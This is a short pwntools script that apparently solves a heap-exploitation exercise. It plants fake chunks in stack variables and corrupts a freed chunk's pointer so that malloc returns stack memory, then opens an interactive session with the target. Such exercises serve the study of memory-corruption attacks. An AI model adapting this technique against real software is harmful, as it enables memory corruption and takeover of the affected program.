from pwn import *
from handle import *

def exploit():
	malloc(0x10)
	A_info = chunk_info(0)
	A = A_info[0]
	fake_chunk1 = stack_var_1_address()
	fake_chunk2 = stack_var_2_address()
	write_to_stack_var_1(p64(0x0) + p64(0x30) + p64(A-2*0x8) + p64(fake_chunk2))
	write_to_stack_var_2("AAAAAAAA" + "AAAAAAAA" + p64(fake_chunk1))
	malloc(0x500)
	free_chunk(0)
	malloc(0x500)
	A_info = chunk_info(0)
	write_to_chunk(0, "AAAAAAAA" + p64(fake_chunk1))
	malloc(0x10)
	malloc(0x10)

p = exec_file()
exploit()
p.interactive()
p.close
